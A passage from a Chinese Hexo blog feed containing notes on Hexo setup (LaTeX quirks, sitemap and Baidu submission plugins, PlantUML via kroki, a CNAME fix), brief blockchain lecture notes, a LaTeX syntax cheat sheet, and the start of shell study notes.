<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><span id = "latex">注意事项</span></h4><h5 id="1-表格中不能使用-，需要使用latex中的-mid来代替"><a href="#1-表格中不能使用-，需要使用latex中的-mid来代替" class="headerlink" title="1. 表格中不能使用\|，需要使用latex中的\mid来代替"></a>1. 表格中不能使用<code>\|</code>，需要使用latex中的<code>\mid</code>来代替</h5><p>示例</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">| 描述       | 代码              |</span><br><span class="line">| ---------- | ----------------- |</span><br><span class="line">| 使用`<span class="keyword">\|</span>`   | a            <span class="keyword">\|</span> b |</span><br><span class="line">| 使用`<span class="keyword">\mid</span>` | a <span class="built_in">$</span> <span class="keyword">\mid</span> <span class="built_in">$</span> b      |</span><br></pre></td></tr></table></figure>

<p>效果</p>
<table>
<thead>
<tr>
<th>描述</th>
<th>代码</th>
</tr>
</thead>
<tbody><tr>
<td>使用<code>|</code></td>
<td>a            | b</td>
</tr>
<tr>
<td>使用<code>\mid</code></td>
<td>a $ \mid $ b</td>
</tr>
</tbody></table>
<h5 id="2-latex公式在hexo中不能写注释，并且换行使用-无效，需要使用-，大括号需要使用-才可使用"><a href="#2-latex公式在hexo中不能写注释，并且换行使用-无效，需要使用-，大括号需要使用-才可使用" class="headerlink" title="2. latex公式在hexo中不能写注释，并且换行使用\\无效，需要使用\\\\，大括号需要使用\\{才可使用"></a>2. latex公式在hexo中不能写注释，并且换行使用<code>\\</code>无效，需要使用<code>\\\\</code>，大括号需要使用<code>\\&#123;</code>才可使用</h5><h5 id="3-latex公式在hexo中，出现没有解析成公式的情况，仔细对照代码和显示的代码，找到少的那个特殊字符（如-），给它加上"><a href="#3-latex公式在hexo中，出现没有解析成公式的情况，仔细对照代码和显示的代码，找到少的那个特殊字符（如-），给它加上" class="headerlink" title="3. latex公式在hexo中，出现没有解析成公式的情况，仔细对照代码和显示的代码，找到少的那个特殊字符（如_），给它加上\"></a>3. latex公式在hexo中，出现没有解析成公式的情况，仔细对照代码和显示的代码，找到少的那个特殊字符（如<code>_</code>），给它加上<code>\</code></h5><h2 id="5-sitemap生成工具"><a href="#5-sitemap生成工具" class="headerlink" title="5. sitemap生成工具"></a>5. sitemap生成工具</h2><h3 id="5-1-google"><a href="#5-1-google" class="headerlink" title="5.1. google"></a>5.1. google</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>

<h3 id="5-2-baidu"><a href="#5-2-baidu" class="headerlink" title="5.2. baidu"></a>5.2. baidu</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure>

<h2 id="6-baidu站点自动提交"><a href="#6-baidu站点自动提交" class="headerlink" title="6. baidu站点自动提交"></a>6. baidu站点自动提交</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-baidu-url-submit --save</span><br></pre></td></tr></table></figure>

<p>修改<code>_config.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:Githubwyb/Githubwyb.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">baidu_url_submitter</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置百度主动推送</span></span><br><span class="line"><span class="attr">baidu_url_submit:</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">500</span>                   <span class="comment"># 比如200，代表提交最新的200个链接</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">githubwyb.github.io</span>    <span class="comment"># 在百度站长平台中注册的域名，这个改为你自己的域名</span></span><br><span class="line">  <span class="attr">token:</span> <span class="string">xxxxxx</span>                <span class="comment"># 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">baidu_urls.txt</span>         <span class="comment"># 文本文档的地址， 新链接会保存在此文本文档里，这个默认</span></span><br></pre></td></tr></table></figure>

<h2 id="7-plantuml支持"><a href="#7-plantuml支持" class="headerlink" title="7. plantuml支持"></a>7. plantuml支持</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-filter-kroki</span><br></pre></td></tr></table></figure>

<p><a href="https://www.npmjs.com/package/hexo-filter-kroki">hexo-filter-kroki文档</a></p>
<h3 id="7-1-配置"><a href="#7-1-配置" class="headerlink" title="7.1. 配置"></a>7.1. 配置</h3><ul>
<li>不配置就是默认的配置</li>
<li>注意不能替换成plantuml搭建的服务器，因为默认是base64加密，和plantuml不一致</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">kroki:</span></span><br><span class="line">  <span class="comment"># the kroki free service server, you may switch to your self-hosted sever.</span></span><br><span class="line">  <span class="attr">server:</span> <span class="string">&quot;https://kroki.io/&quot;</span>       <span class="comment"># 服务器地址，想要自己搭建就 docker pull yuzutech/kroki</span></span><br><span class="line">  <span class="comment"># Available values</span></span><br><span class="line">  <span class="comment"># &quot;inline&quot;: &lt;svg&gt;xxx&lt;svg/&gt;</span></span><br><span class="line">  <span class="comment"># &quot;inlineUrlEncode&quot;: &lt;img src=&#x27;data:image/svg+xml;&gt;</span></span><br><span class="line">  <span class="comment"># &quot;inlineBase64&quot;: &lt;img src=&#x27;data:image/svg+xml;base64&gt;</span></span><br><span class="line">  <span class="comment"># &quot;localLink&quot;: &lt;img src=&quot;/assert/puml/xxxx.svg&quot;&gt;</span></span><br><span class="line">  <span class="comment"># &quot;externalLink&quot;: &lt;img src=&quot;http://www.plantuml.com/plantuml/svg/xxx&quot;&gt;</span></span><br><span class="line">  <span class="attr">link:</span> <span class="string">&quot;externalLink&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># common options: svg/png</span></span><br><span class="line">  <span class="attr">outputFormat:</span> <span class="string">&quot;svg&quot;</span></span><br><span class="line">  <span class="comment"># the generated img will have a default class name.</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">&#x27;kroki&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># append some fragment per diagram, used for the theme or else config</span></span><br><span class="line">  <span class="attr">inserts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">diagram:</span> <span class="string">plantuml</span></span><br><span class="line">      <span class="attr">after:</span> <span class="number">1</span></span><br><span class="line">      <span class="comment"># see https://plantuml.com/en/theme</span></span><br><span class="line">      <span class="attr">fragment:</span> <span class="string">&#x27;!theme sketchy-outline&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">diagram:</span> <span class="string">mermaid</span></span><br><span class="line">      <span class="attr">after:</span> <span class="number">0</span></span><br><span class="line">      <span class="comment"># see https://mermaid-js.github.io/mermaid/#/theming</span></span><br><span class="line">      <span class="attr">fragment:</span> <span class="string">&quot;%<span class="template-variable">%&#123;init: &#123;&#x27;theme&#x27;: &#x27;base&#x27;, &#x27;themeVariables&#x27;: &#123; &#x27;primaryColor&#x27;: &#x27;#ff0000&#x27;&#125;</span>&#125;&#125;%%&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-搭建kroki本地服务器"><a href="#7-2-搭建kroki本地服务器" class="headerlink" title="7.2. 搭建kroki本地服务器"></a>7.2. 搭建kroki本地服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull yuzutech/kroki</span><br><span class="line">docker run -d -p 8000:8000 yuzutech/kroki</span><br></pre></td></tr></table></figure>

<p><strong>效果</strong></p>
<p>在markdown中写入</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="code">` `</span>`plantuml</span><br><span class="line">@startuml</span><br><span class="line">a-&gt;b</span><br><span class="line">b-&gt;c</span><br><span class="line">c-&gt;a</span><br><span class="line">@enduml</span><br><span class="line"><span class="code">```</span></span><br></pre></td></tr></table></figure>

<?xml version="1.0" encoding="us-ascii" standalone="no"?><svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" height="133px" preserveAspectRatio="none" style="width:98px;height:133px;background:#FFFFFF;" version="1.1" viewBox="0 0 98 133" width="98px" zoomAndPan="magnify" class="kroki">$2<defs/><g><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="16" x2="16" y1="36.2969" y2="98.2969"/><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="48" x2="48" y1="36.2969" y2="98.2969"/><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="81" x2="81" y1="36.2969" y2="98.2969"/><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="22" x="5" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="8" x="12" y="24.9951">a</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="22" x="5" y="97.2969"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="8" x="12" y="117.292">a</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="23" x="37" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="9" x="44" y="24.9951">b</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="23" x="37" y="97.2969"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="9" x="44" y="117.292">b</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="22" x="70" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="8" x="77" y="24.9951">c</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="22" x="70" y="97.2969"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="8" x="77" y="117.292">c</text><polygon fill="#181818" points="36.5,48.2969,46.5,52.2969,36.5,56.2969,40.5,52.2969" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="16" x2="42.5" y1="52.2969" y2="52.2969"/><polygon fill="#181818" points="69,62.2969,79,66.2969,69,70.2969,73,66.2969" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="48.5" x2="75" y1="66.2969" y2="66.2969"/><polygon fill="#181818" points="27,76.2969,17,80.2969,27,84.2969,23,80.2969" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="21" x2="80" y1="80.2969" y2="80.2969"/><!--SRC=[IzIrI-9AqhLBvahMjKi40000]--></g></svg>

<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-latex注意事项"><a href="#1-latex注意事项" class="headerlink" title="1. latex注意事项"></a>1. <a href="#latex">latex注意事项</a></h2><h2 id="2-自建域名在博客部署后解析失败"><a href="#2-自建域名在博客部署后解析失败" class="headerlink" title="2. 自建域名在博客部署后解析失败"></a>2. 自建域名在博客部署后解析失败</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ul>
<li>博客部署到github上时，如果使用自建域名需要添加<code>CNAME</code>文件到根目录下</li>
<li>hexo在部署时会把远程仓库整个覆盖掉，导致<code>CNAME</code>文件缺失而解析失败</li>
</ul>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ul>
<li>在<code>\hexo\source</code>目录下放入<code>CNAME</code>文件即可</li>
<li>所有source目录下的除了规定格式的会解析，其余文件都会原封不动放入仓库</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>区块链-达闼科技师兄分享</title>
    <url>/blogs/2018-09-19-DakaQukuailian/</url>
    <content><![CDATA[<h1 id="区块链定义"><a href="#区块链定义" class="headerlink" title="区块链定义"></a>区块链定义</h1><p>让数据包可以传递价值</p>
<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>两个节点的交易让所有节点数据库都要更新</p>
<h1 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h1><ul>
<li>一式多份</li>
<li>一诺千金（区块链防篡改）</li>
</ul>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ul>
<li>效率问题怎么解决</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>latex笔记</title>
    <url>/blogs/2018-09-18-latexStudy/</url>
    <content><![CDATA[<h1 id="一、markdown中的latex"><a href="#一、markdown中的latex" class="headerlink" title="一、markdown中的latex"></a>一、markdown中的latex</h1><ul>
<li>行内公式 <code>$\&#123;[z-(1+\frac23x)y]\div 4\&#125;$</code>: ${[z-(1+\frac23x)y]\div4}$</li>
<li>块级公式 <code>$$\sum_&#123;i = 1&#125;^n a_i=0$$</code>: $$\sum_{i &#x3D; 1}^n a_i&#x3D;0$$</li>
</ul>
<h1 id="二、公式格式记录"><a href="#二、公式格式记录" class="headerlink" title="二、公式格式记录"></a>二、公式格式记录</h1><h2 id="1-符号"><a href="#1-符号" class="headerlink" title="1. 符号"></a>1. 符号</h2><p>参考文档: <a href="http://www.mohu.org/info/symbols/symbols.htm">常用数学符号的 LaTeX 表示方法</a></p>
<h3 id="常用数学符号"><a href="#常用数学符号" class="headerlink" title="常用数学符号"></a>常用数学符号</h3><ul>
<li><code>$\sigma$</code>: $\sigma$</li>
<li>累加算子<code>$\Sigma$</code>: $\Sigma$</li>
<li>梯度算子<code>$\nabla$</code>: $\nabla$</li>
<li>偏导算子<code>$\partial$</code>: $\partial$</li>
<li><code>$\eta$</code>: $\eta$</li>
<li><code>$\delta$</code>: $\delta$</li>
<li><code>$\varphi</code>: $\varphi$</li>
<li>属于<code>$\in$</code>: $\in$</li>
<li>无穷<code>$\infty$</code>: $\infty$</li>
<li>任意<code>$\forall$</code>: $\forall$</li>
<li>约等于<code>$\approx$</code>: $\approx$</li>
<li>因为<code>$\because$</code>: $\because$</li>
<li>所以<code>$\therefore$</code>: $\therefore$</li>
<li>字母右上角一撇<code>$a^&#123;\prime&#125;$</code>: $a^{\prime}$</li>
<li>箭头<code>$\leftarrow$</code>: $\leftarrow$</li>
</ul>
<h3 id="几个特殊符号的转义"><a href="#几个特殊符号的转义" class="headerlink" title="几个特殊符号的转义"></a>几个特殊符号的转义</h3><table>
<thead>
<tr>
<th>符号</th>
<th>latex表示</th>
</tr>
</thead>
<tbody><tr>
<td>$#$</td>
<td><code>\#</code></td>
</tr>
<tr>
<td>$$$</td>
<td><code>\$</code></td>
</tr>
<tr>
<td>$%$</td>
<td><code>\%</code></td>
</tr>
<tr>
<td>${$</td>
<td><code>\&#123;</code></td>
</tr>
<tr>
<td>$}$</td>
<td><code>\&#125;</code></td>
</tr>
<tr>
<td>$~{}$</td>
<td><code>\~&#123;&#125;</code></td>
</tr>
<tr>
<td>$_{}$</td>
<td><code>\_&#123;&#125;</code></td>
</tr>
<tr>
<td>$^{}$</td>
<td><code>\^&#123;&#125;</code></td>
</tr>
<tr>
<td>$\backslash$</td>
<td><code>\backslash</code></td>
</tr>
<tr>
<td>$&amp;$</td>
<td><code>\&amp;</code></td>
</tr>
</tbody></table>
<h2 id="2-空格"><a href="#2-空格" class="headerlink" title="2. 空格"></a>2. 空格</h2><table>
<thead>
<tr>
<th>描述</th>
<th>代码</th>
<th>效果</th>
<th>宽度</th>
</tr>
</thead>
<tbody><tr>
<td>两个quad空格</td>
<td>a \qquad b</td>
<td>$a \qquad b$</td>
<td>两个m的宽度</td>
</tr>
<tr>
<td>quad空格</td>
<td>a \quad b</td>
<td>$a \quad b$</td>
<td>一个m的宽度</td>
</tr>
<tr>
<td>大空格</td>
<td>a\ b</td>
<td>$a\ b$</td>
<td>1&#x2F;3m宽度</td>
</tr>
<tr>
<td>中等空格</td>
<td>a\;b</td>
<td>$a\;b$</td>
<td>2&#x2F;7m宽度</td>
</tr>
<tr>
<td>小空格</td>
<td>a\,b</td>
<td>$a\,b$</td>
<td>1&#x2F;6m宽度</td>
</tr>
<tr>
<td>没有空格</td>
<td>ab</td>
<td>$ab$</td>
<td></td>
</tr>
<tr>
<td>紧贴</td>
<td>a\!b</td>
<td>$a\!b$</td>
<td>缩进1&#x2F;6m宽度</td>
</tr>
</tbody></table>
<h2 id="3-乘方"><a href="#3-乘方" class="headerlink" title="3. 乘方"></a>3. 乘方</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span> a<span class="built_in">^</span>b <span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span> a<span class="built_in">^</span>bc <span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span> a<span class="built_in">^</span>&#123;bc&#125; <span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>$$ a^b $$<br>$$ a^bc $$<br>$$ a^{bc} $$</p>
<h2 id="4-分数"><a href="#4-分数" class="headerlink" title="4. 分数"></a>4. 分数</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span> <span class="keyword">\frac</span>&#123;A&#125;&#123;B&#125; <span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span> <span class="keyword">\frac</span> abc <span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>$$ \frac{A}{B} $$<br>$$ \frac abc $$</p>
<h2 id="5-阶段函数表示"><a href="#5-阶段函数表示" class="headerlink" title="5. 阶段函数表示"></a>5. 阶段函数表示</h2><p>array后面的<code>ll</code>表示每一列的对齐方式，l：左对齐，c：居中，r：右对齐</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line">f(z) = <span class="keyword">\left</span><span class="keyword">\&#123;</span><span class="keyword">\begin</span>&#123;array&#125;&#123;ll&#125;</span><br><span class="line">    1 <span class="built_in">&amp;</span> &#123;z &gt; 0&#125; <span class="keyword">\\</span></span><br><span class="line">    0 <span class="built_in">&amp;</span> otherwise</span><br><span class="line"><span class="keyword">\end</span>&#123;array&#125;<span class="keyword">\right</span>.</span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>$$ f(z) &#x3D; \left\{\begin{array}{ll}<br>    1 &amp; {z &gt; 0} \\<br>    0 &amp; otherwise<br>\end{array}\right. $$</p>
<h2 id="6-公式推导换行等号对齐"><a href="#6-公式推导换行等号对齐" class="headerlink" title="6. 公式推导换行等号对齐"></a>6. 公式推导换行等号对齐</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;aligned&#125;</span><br><span class="line">    f(x) <span class="built_in">&amp;</span> = (x + 1)<span class="built_in">^</span>2 <span class="keyword">\\</span></span><br><span class="line">    <span class="built_in">&amp;</span> = x<span class="built_in">^</span>2 + 2x + 1</span><br><span class="line"><span class="keyword">\end</span>&#123;aligned&#125;</span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>$$<br>\begin{aligned}<br>    f(x) &amp; &#x3D; (x + 1)^2 \\<br>    &amp; &#x3D; x^2 + 2x + 1<br>\end{aligned}<br>$$</p>
<h2 id="7-公式编号"><a href="#7-公式编号" class="headerlink" title="7. 公式编号"></a>7. 公式编号</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 手动编号，一个块级公式只能用一个tag</span></span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span> x = (tp<span class="built_in">_</span>1, tp<span class="built_in">_</span>2, ..., tp<span class="built_in">_</span>&#123;N - 1&#125;, tp<span class="built_in">_</span>N), <span class="keyword">\tag</span>&#123;1&#125;<span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span> y = (0, 1, ..., 0, 0), <span class="keyword">\tag</span>&#123;2&#125;<span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 自动编号</span></span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;equation&#125;</span><br><span class="line">x<span class="built_in">^</span>n+y<span class="built_in">^</span>n=z<span class="built_in">^</span>n</span><br><span class="line"><span class="keyword">\end</span>&#123;equation&#125;</span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>$$ x &#x3D; (tp_1, tp_2, …, tp_{N - 1}, tp_N), \tag{1}$$<br>$$ y &#x3D; (0, 1, …, 0, 0), \tag{2}$$</p>
<p>$$\begin{equation}<br>    x^n+y^n&#x3D;z^n<br>\end{equation}$$</p>
<h2 id="8-log函数"><a href="#8-log函数" class="headerlink" title="8. log函数"></a>8. log函数</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span> log<span class="built_in">_</span>A&#123;B&#125; <span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>$$ log_A{B} $$</p>
<h2 id="9-累加符号"><a href="#9-累加符号" class="headerlink" title="9. 累加符号"></a>9. 累加符号</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">- 行间公式 <span class="built_in">$</span> <span class="keyword">\sum</span><span class="built_in">_</span>&#123;N&#125;<span class="built_in">^</span>&#123;n&#125;a <span class="built_in">$</span></span><br><span class="line">- 独立公式 <span class="built_in">$</span><span class="built_in">$</span> <span class="keyword">\sum</span><span class="built_in">_</span>&#123;N&#125;<span class="built_in">^</span>&#123;n&#125;a <span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line">- 行间公式使用上下形式 <span class="built_in">$</span> <span class="keyword">\sum</span><span class="keyword">\limits</span><span class="built_in">_</span>&#123;N&#125;<span class="built_in">^</span>&#123;n&#125;a <span class="built_in">$</span></span><br><span class="line">- 独立公式使用左右形式 <span class="built_in">$</span><span class="built_in">$</span> <span class="keyword">\sum</span><span class="keyword">\nolimits</span><span class="built_in">_</span>&#123;N&#125;<span class="built_in">^</span>&#123;n&#125;a <span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line">- 不加大括号 <span class="built_in">$</span> <span class="keyword">\sum</span><span class="keyword">\limits</span><span class="built_in">_</span>N<span class="built_in">^</span>na <span class="built_in">$</span></span><br><span class="line">- 不加大括号 <span class="built_in">$</span> <span class="keyword">\sum</span><span class="keyword">\limits</span><span class="built_in">_</span>Nb<span class="built_in">^</span>na <span class="built_in">$</span></span><br><span class="line">- 加大括号 <span class="built_in">$</span> <span class="keyword">\sum</span><span class="keyword">\limits</span><span class="built_in">_</span>&#123;Nb&#125;<span class="built_in">^</span>&#123;na&#125; <span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<ul>
<li>行间公式 $ \sum_{N}^{n}a $</li>
<li>独立公式 $$ \sum_{N}^{n}a $$</li>
<li>行间公式使用上下形式 $ \sum\limits_{N}^{n}a $</li>
<li>独立公式使用左右形式 $$ \sum\nolimits_{N}^{n}a $$</li>
<li>不加大括号 $ \sum\limits_N^na $</li>
<li>不加大括号 $ \sum\limits_Nb^na $</li>
<li>加大括号 $ \sum\limits_{Nb}^{na} $</li>
</ul>
<h2 id="10-最小值下方加参数"><a href="#10-最小值下方加参数" class="headerlink" title="10. 最小值下方加参数"></a>10. 最小值下方加参数</h2><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span> <span class="keyword">\min</span><span class="keyword">\limits</span><span class="built_in">_</span>&#123;w <span class="keyword">\in</span> W&#125; <span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>$$ \min\limits_{w \in W} $$</p>
<h2 id="11-矩阵"><a href="#11-矩阵" class="headerlink" title="11. 矩阵"></a>11. 矩阵</h2><h3 id="直接使用矩阵符号"><a href="#直接使用矩阵符号" class="headerlink" title="直接使用矩阵符号"></a>直接使用矩阵符号</h3><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;matrix&#125; 0 <span class="built_in">&amp;</span> 1 <span class="keyword">\\</span> 1 <span class="built_in">&amp;</span> 0 <span class="keyword">\end</span>&#123;matrix&#125;</span><br><span class="line"><span class="keyword">\quad</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;pmatrix&#125; 0 <span class="built_in">&amp;</span> -i <span class="keyword">\\</span> i <span class="built_in">&amp;</span> 0 <span class="keyword">\end</span>&#123;pmatrix&#125;</span><br><span class="line"><span class="keyword">\quad</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;bmatrix&#125; 0 <span class="built_in">&amp;</span> -1 <span class="keyword">\\</span> 1 <span class="built_in">&amp;</span> 0 <span class="keyword">\end</span>&#123;bmatrix&#125;</span><br><span class="line"><span class="keyword">\quad</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;Bmatrix&#125; 1 <span class="built_in">&amp;</span> 0 <span class="keyword">\\</span> 0 <span class="built_in">&amp;</span> -1 <span class="keyword">\end</span>&#123;Bmatrix&#125;</span><br><span class="line"><span class="keyword">\quad</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;vmatrix&#125; a <span class="built_in">&amp;</span> b <span class="keyword">\\</span> c <span class="built_in">&amp;</span> d <span class="keyword">\end</span>&#123;vmatrix&#125;</span><br><span class="line"><span class="keyword">\quad</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;Vmatrix&#125; i <span class="built_in">&amp;</span> 0 <span class="keyword">\\</span> 0 <span class="built_in">&amp;</span> -i <span class="keyword">\end</span>&#123;Vmatrix&#125;</span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>$$<br>\begin{matrix} 0 &amp; 1 \\ 1 &amp; 0 \end{matrix}<br>\quad<br>\begin{pmatrix} 0 &amp; -i \\ i &amp; 0 \end{pmatrix}<br>\quad<br>\begin{bmatrix} 0 &amp; -1 \\ 1 &amp; 0 \end{bmatrix}<br>\quad<br>\begin{Bmatrix} 1 &amp; 0 \\ 0 &amp; -1 \end{Bmatrix}<br>\quad<br>\begin{vmatrix} a &amp; b \\ c &amp; d \end{vmatrix}<br>\quad<br>\begin{Vmatrix} i &amp; 0 \\ 0 &amp; -i \end{Vmatrix}<br>$$</p>
<h3 id="使用array构建矩阵"><a href="#使用array构建矩阵" class="headerlink" title="使用array构建矩阵"></a>使用<code>array</code>构建矩阵</h3><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br><span class="line"><span class="keyword">\left</span>(                  <span class="comment">%左括号</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;array&#125;&#123;ccc&#125;      <span class="comment">%该矩阵一共3列，每一列都居中放置</span></span><br><span class="line">    a11 <span class="built_in">&amp;</span> a12 <span class="built_in">&amp;</span> a13<span class="keyword">\\</span>   <span class="comment">%第一行元素</span></span><br><span class="line">    a21 <span class="built_in">&amp;</span> a22 <span class="built_in">&amp;</span> a23<span class="keyword">\\</span>   <span class="comment">%第二行元素</span></span><br><span class="line"><span class="keyword">\end</span>&#123;array&#125;</span><br><span class="line"><span class="keyword">\right</span>)                 <span class="comment">%右括号</span></span><br><span class="line"><span class="built_in">$</span><span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p>$$<br>\left(\begin{array}{ccc}<br>    a11 &amp; a12 &amp; a13 \\<br>    a21 &amp; a22 &amp; a23<br>\end{array}\right)<br>$$</p>
]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>shell学习笔记</title>
    <url>/blogs/2018-09-16-shellStudy/</url>
    <content><![CDATA[<h1 id="一、语法相关"><a href="#一、语法相关" class="headerlink" title="一、语法相关"></a>一、语法相关</h1><h2 id="1-进制数字表示"><a href="#1-进制数字表示" class="headerlink" title="1. 进制数字表示"></a>1. 进制数字表示</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二进制转十进制输出，其他同理</span></span><br><span class="line">echo $((2#100100))</span><br></pre></td></tr></table></figure>

<h2 id="2-目录特殊符号"><a href="#2-目录特殊符号" class="headerlink" title="2. 目录特殊符号"></a>2. 目录特殊符号</h2><ul>
<li>上一级 <code>..</code></li>
<li>当前目录 <code>.</code></li>
<li>当前用户目录 <code>~</code></li>
<li>根目录 <code>/</code></li>
</ul>
